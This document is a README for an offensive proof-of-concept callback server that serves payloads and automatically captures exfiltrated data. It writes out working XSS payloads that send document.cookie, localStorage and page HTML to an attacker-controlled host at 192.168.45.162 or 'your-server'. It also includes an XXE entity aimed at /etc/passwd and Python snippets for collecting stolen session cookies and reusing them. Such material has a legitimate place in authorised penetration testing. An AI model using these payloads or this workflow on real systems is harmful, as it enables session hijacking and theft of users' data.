# POC Server with Callback Hooks

Single HTTP server that serves payloads, logs requests, and **automatically captures cookies and other interesting data**.

## Features

- Serves files from `../payloads/` directory
- Logs ALL requests to `../logs/server.ndjson`
- **Auto-captures cookies** from `?cookie=` parameters (base64 decoded)
- **Event queue** for processing callbacks in your exploit
- CORS enabled for XSS testing
- Handles GET/POST/OPTIONS

## Quick Start

```bash
# Default: port 8000
python servers/server.py

# Custom port
python servers/server.py -p 8888
```

## Automatic Cookie Capture 🍪

When the server receives `?cookie=xxx`, it automatically:
1. Base64 decodes the value
2. Logs to `logs/events.ndjson`
3. Highlights in console with 🍪
4. Adds to event queue for processing

Example XSS payload:
```javascript
<img src=x onerror="fetch('http://192.168.45.162:8888?cookie='+btoa(document.cookie))">
```

## Using from Your Exploit

### Method 1: Wait for Callback (Blocking)
```python
from poc.utils.server_hooks import wait_for_callback

# Send your XSS payload
send_xss_payload()

# Wait for cookie (blocks up to 30 seconds)
cookie = wait_for_callback(timeout=30, param='cookie')
if cookie:
    print(f"Got session: {cookie}")
    # Use it for authenticated requests
```

### Method 2: Background Monitor (Non-blocking)
```python
from poc.utils.server_hooks import watch_events
import threading

def process_cookie(event):
    if event['type'] == 'cookie':
        print(f"Cookie: {event['data']}")
        # Process the cookie...

# Start background monitor
threading.Thread(target=watch_events, args=(process_cookie,), daemon=True).start()
```

### Method 3: Get Latest Cookie
```python
from poc.utils.server_hooks import get_latest_cookie

cookie = get_latest_cookie()
if cookie:
    print(f"Found: {cookie}")
```

## Other Callbacks

### XSS Data Exfiltration
```javascript
// Steal localStorage
fetch('http://your-server:8000?data=' + btoa(JSON.stringify(localStorage)))

// Steal DOM content
fetch('http://your-server:8000?html=' + btoa(document.body.innerHTML))
```

### Blind Exploitation
```python
# Confirm blind SQLi/XXE/etc
if injection_worked:
    requests.get(f"http://your-server:8000/blind?stage=sqli&success=true")
```

### SSRF/XXE
```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://your-server:8000/xxe?file=/etc/passwd">]>
```

## Log Files

- `logs/server.ndjson` - All HTTP requests
- `logs/events.ndjson` - Interesting events (cookies, etc)

Monitor in real-time:
```bash
# All requests
tail -f logs/server.ndjson | jq .

# Just events
tail -f logs/events.ndjson | jq .

# Filter cookies
tail -f logs/events.ndjson | jq 'select(.type=="cookie")'
```

## Tips

1. **Start server first** - Before sending payloads
2. **Use external IP** - For remote targets
3. **Check firewall** - Ensure port is accessible
4. **Base64 encode** - Avoids URL encoding issues
5. **Unique paths** - Like `/xss-test-1` to identify injection points